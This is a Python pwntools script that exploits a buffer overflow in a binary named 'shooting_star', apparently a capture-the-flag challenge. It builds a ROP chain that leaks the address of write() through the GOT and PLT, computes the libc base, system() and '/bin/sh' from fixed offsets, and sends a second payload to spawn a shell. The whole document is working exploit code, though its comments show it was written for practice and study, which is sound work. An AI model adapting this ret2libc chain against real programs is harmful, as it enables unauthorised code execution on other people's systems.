#!/usr/bin/python
from pwn import *

# Set up pwntools for the correct architecture
exe = './shooting_star'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

menu_option = b'1'
offset = 72
junk = b'A' * offset



# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = 72

# Start program
io = process() 

# Need pop RDI gadget to pass 'sh' to system():
# ropper - f shooting_star - -search "pop rdi"
pop_rdi = 0x4012cb
# Need pop RSI to put got.write address in (before leaking via plt.write)
pop_rsi_r15 = 0x4012c9  # pop rsi; pop r15; ret;


# Build the payload
payload = flat(
    {offset: [
        pop_rsi_r15,  # Pop the following value from stack into RSI
        elf.got.write,  # Address of write() in GOT
        0x0,  # Don't need anything in r15
        elf.plt.write,  # Call plt.write() to print address of got.write()
        elf.symbols.main  # Return to beginning of star function
    ]}
)

print (payload)

# Send the payload
io.sendlineafter('>', '1')
io.sendlineafter('>>', payload)
io.recvuntil('May your wish come true!\n')

# Get our leaked got.write address and format it
leaked_addr = io.recv()
got_write = unpack(leaked_addr[:6].ljust(8, b"\x00"))
info("leaked got_write: %#x", got_write)

# We can get libc base address by subtracting offset of write
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep write
libc_base = got_write - 0xeef20
info("libc_base: %#x", libc_base)

# Now we can calculate system location:
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
# Could have also got offset in GDB-pwndbg with 'print &system - &write'
system_addr = libc_base + 0x48e50
info("system_addr: %#x", system_addr)

# We also need /bin/sh offset, can get in GDB using 'search -s "/bin/sh"'
# Can also get with 'strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"'
bin_sh = libc_base + 0x18a156
info("bin_sh: %#x", bin_sh)

# Now let's build our actual payload, using the system() address
payload = flat(
    {offset: [
        pop_rdi,  # Pop the following value from stack into RDI
        bin_sh,  # Pop me plz xD
        system_addr  # Now call system('sh')
    ]}
)

# Send the payload
io.sendline('1')
io.sendlineafter('>>', payload)
io.recvuntil('May your wish come true!\n')

# Got Shell?
io.interactive()

